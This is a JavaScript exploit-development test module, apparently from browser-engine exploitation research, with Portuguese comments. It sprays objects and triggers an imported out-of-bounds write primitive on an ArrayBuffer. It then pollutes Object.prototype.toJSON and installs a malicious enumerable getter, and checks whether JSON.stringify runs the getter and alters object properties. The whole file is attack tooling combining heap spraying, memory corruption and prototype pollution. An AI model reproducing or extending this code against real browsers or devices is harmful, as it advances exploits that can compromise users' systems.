// js/script3/testMyComplexObjectGetterExploit.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

const GADGET_PROPERTY_NAME_ON_MYCOMPLEX = "AAAA_MyComplexGetterTrigger";
let getter_on_mycomplex_called_flag = false;
let captured_mycomplex_getter_state = {};

class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.value1 = 12345;
        this.value2 = "initial_state";
        this.marker = 0xCAFECAFE;
        this.anotherProp = "original_value";
        // Outras props como no teste de [13:29:30] se necessário para o for...in
        this.propA = "valA";
    }
}

// toJSON que usa for...in, que anteriormente acionou o getter enumerável.
// Vamos mantê-la simples para focar no acionamento do getter.
export function toJSON_LoopToTriggerGetter() {
    const FNAME_toJSON = "toJSON_LoopToTriggerGetter";
    let returned_payload = {};
    let iteration_count = 0;
    // console.log(`[${FNAME_toJSON}] Entrando. this.id: ${this && this.id !== undefined ? this.id : 'N/A'}`);
    try {
        for (const prop in this) {
            iteration_count++;
            if (Object.prototype.hasOwnProperty.call(this, prop)) {
                // A simples tentativa de JSON.stringify de acessar a propriedade do getter o invocará.
                // Incluímos todas as propriedades para simular o comportamento original.
                returned_payload[prop] = this[prop];
            }
            if (iteration_count > 100) { // Safety break
                logS3(`[${FNAME_toJSON}] Loop excedeu 100 iterações. ID: ${this.id}`, "warn", FNAME_toJSON);
                break;
            }
        }
    } catch (e) {
        logS3(`[${FNAME_toJSON}] ERRO no loop for...in: ${e.name} - ${e.message}`, "error", FNAME_toJSON);
        returned_payload._LOOP_ERROR_ = `${e.name}: ${e.message}`;
    }
    returned_payload._toJSON_MARKER_ = FNAME_toJSON;
    returned_payload._iterations_ = iteration_count;
    return returned_payload;
}

export async function executeMyComplexObjectGetterExploitTest() {
    const FNAME_TEST = "executeMyComplexObjectGetterExploitTest";
    logS3(`--- Iniciando Teste: Exploração do Getter em MyComplexObject ---`, "test", FNAME_TEST);
    document.title = `MyComplexObject Getter Exploit`;

    getter_on_mycomplex_called_flag = false;
    captured_mycomplex_getter_state = {};

    let originalGetterDesc = Object.getOwnPropertyDescriptor(MyComplexObject.prototype, GADGET_PROPERTY_NAME_ON_MYCOMPLEX);
    let getterPollutionAppliedOnMyComplex = false;

    try {
        logS3(`Definindo getter '${GADGET_PROPERTY_NAME_ON_MYCOMPLEX}' em MyComplexObject.prototype...`, 'info', FNAME_TEST);
        Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME_ON_MYCOMPLEX, {
            get: function() {
                const GETTER_FNAME = "MyComplexObject_EvilGetter";
                logS3(`!!!! GETTER EM MyComplexObject '${GADGET_PROPERTY_NAME_ON_MYCOMPLEX}' CHAMADO !!!!`, "vuln", GETTER_FNAME);
                getter_on_mycomplex_called_flag = true;
                captured_mycomplex_getter_state = { was_called: true };

                try {
                    captured_mycomplex_getter_state.id_read = this.id;
                    captured_mycomplex_getter_state.instanceof_MyComplexObject = this instanceof MyComplexObject;
                    captured_mycomplex_getter_state.toString_call_this = Object.prototype.toString.call(this);

                    logS3(`   [${GETTER_FNAME}] 'this' ID: ${this.id}, instanceof MyComplexObject: ${this instanceof MyComplexObject}, toString: ${Object.prototype.toString.call(this)}`, "info", GETTER_FNAME);

                    captured_mycomplex_getter_state.marker_before = this.marker;
                    this.marker = 0xBADBEEF1; // Modificação 1
                    captured_mycomplex_getter_state.marker_after = this.marker;

                    captured_mycomplex_getter_state.value1_before = this.value1;
                    this.value1 = 777; // Modificação 2
                    captured_mycomplex_getter_state.value1_after = this.value1;

                    captured_mycomplex_getter_state.anotherProp_before = this.anotherProp;
                    this.anotherProp = "modified_by_getter"; // Modificação 3
                    captured_mycomplex_getter_state.anotherProp_after = this.anotherProp;

                    this.newPropFromGetter = "getter_added_this"; // Nova propriedade
                    captured_mycomplex_getter_state.newPropFromGetter_value = this.newPropFromGetter;

                    logS3(`   [${GETTER_FNAME}] Marker: ${toHex(captured_mycomplex_getter_state.marker_before)}->${toHex(this.marker)}, Val1: ${captured_mycomplex_getter_state.value1_before}->${this.value1}, anotherProp: "${captured_mycomplex_getter_state.anotherProp_before}"->"${this.anotherProp}"`, "info", GETTER_FNAME);

                } catch (e_getter_ops) {
                    logS3(`   [${GETTER_FNAME}] ERRO DENTRO DO GETTER: ${e_getter_ops.name} - ${e_getter_ops.message}`, "error", GETTER_FNAME);
                    captured_mycomplex_getter_state.error_in_getter = `${e_getter_ops.name}: ${e_getter_ops.message}`;
                }
                return "value_from_mycomplex_getter"; // Getter precisa retornar algo
            },
            configurable: true,
            enumerable: true // Crucial para ser pego pelo for...in e JSON.stringify
        });
        getterPollutionAppliedOnMyComplex = true;
        logS3("Getter definido em MyComplexObject.prototype.", "good", FNAME_TEST);
    } catch (e_getter_setup) {
        logS3(`ERRO ao definir getter em MyComplexObject.prototype: ${e_getter_setup.message}`, "error", FNAME_TEST);
        return;
    }


    const spray_count = 50;
    const sprayed_objects = [];
    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    } catch (e_spray) { logS3("Spray error", "error"); return; }

    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`2. Configurando OOB e escrevendo 0xFFFFFFFF em oob_ab[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) { logS3("OOB setup error", "error"); return; }
    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB realizada.`, "info", FNAME_TEST);
    } catch (e_write) { logS3("OOB write error", "error"); return; }

    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`3. Sondando os primeiros objetos com toJSON_LoopToTriggerGetter...`, "test", FNAME_TEST);
    const ppKey_val = 'toJSON';
    let originalToJSONProtoDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let first_affected_object_details = null;

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_LoopToTriggerGetter,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;

        const objectsToProbe = Math.min(sprayed_objects.length, 10);
        for (let i = 0; i < objectsToProbe; i++) {
            const obj = sprayed_objects[i];
            if (!obj) continue;

            getter_on_mycomplex_called_flag = false; // Reset para cada objeto
            captured_mycomplex_getter_state = {};    // Reset para cada objeto

            logS3(`   Testando objeto ${i} (ID: ${obj.id}). Marker original: ${toHex(obj.marker)}`, 'info', FNAME_TEST);
            try {
                JSON.stringify(obj); // O resultado da toJSON não é o foco, mas se o getter é chamado
            } catch (e_str) {
                logS3(`     !!!! ERRO AO STRINGIFY obj[${i}] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
                // Não parar no primeiro erro, testar os outros.
            }

            if (getter_on_mycomplex_called_flag) {
                logS3(`   !!!! SUCESSO: Getter em MyComplexObject FOI CHAMADO para obj.id=${captured_mycomplex_getter_state.id_read} (index ${i})!!!!`, "vuln", FNAME_TEST);
                logS3(`        Detalhes capturados no getter:`, "info", FNAME_TEST);
                 for(const key in captured_mycomplex_getter_state){ logS3(`          ${key}: ${captured_mycomplex_getter_state[key]}`, "info", FNAME_TEST); }

                first_affected_object_details = {
                    index: i, id: obj.id,
                    marker_after_json: obj.marker,
                    value1_after_json: obj.value1,
                    anotherProp_after_json: obj.anotherProp,
                    newProp_after_json: obj.newPropFromGetter
                };
                document.title = `SUCCESS: MyComplex Getter Called on ${obj.id}! Props Modified!`;
                break; // Parar no primeiro sucesso para análise
            }
        }
    } catch (e_main_loop) { /* ... */ }
    finally {
        if (toJSONPollutionApplied) { /* ... restaura ... */
            if (originalToJSONProtoDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (first_affected_object_details) {
        logS3(`DETALHES DO OBJETO AFETADO (ID: ${first_affected_object_details.id}, Index: ${first_affected_object_details.index}) APÓS stringify:`, "vuln", FNAME_TEST);
        logS3(`  Marker: ${toHex(first_affected_object_details.marker_after_json)} (Esperado: ${toHex(0xBADBEEF1)})`, first_affected_object_details.marker_after_json === 0xBADBEEF1 ? "good" : "warn", FNAME_TEST);
        logS3(`  Value1: ${first_affected_object_details.value1_after_json} (Esperado: 777)`, first_affected_object_details.value1_after_json === 777 ? "good" : "warn", FNAME_TEST);
        logS3(`  anotherProp: "${first_affected_object_details.anotherProp_after_json}" (Esperado: "modified_by_getter")`, first_affected_object_details.anotherProp_after_json === "modified_by_getter" ? "good" : "warn", FNAME_TEST);
        logS3(`  newPropFromGetter: "${first_affected_object_details.newProp_after_json}" (Esperado: "getter_added_this")`, first_affected_object_details.newProp_after_json === "getter_added_this" ? "good" : "warn", FNAME_TEST);
    } else {
        logS3("Teste CONCLUÍDO: Nenhum getter em MyComplexObject foi acionado nos objetos sondados.", "warn", FNAME_TEST);
    }

    if (getterPollutionAppliedOnMyComplex) { /* ... restaura getter ... */
        if (originalGetterDesc) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME_ON_MYCOMPLEX, originalGetterDesc);
        else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME_ON_MYCOMPLEX];
    }

    logS3(`--- Teste Exploração do Getter em MyComplexObject CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0;
    globalThis.gc?.();
}
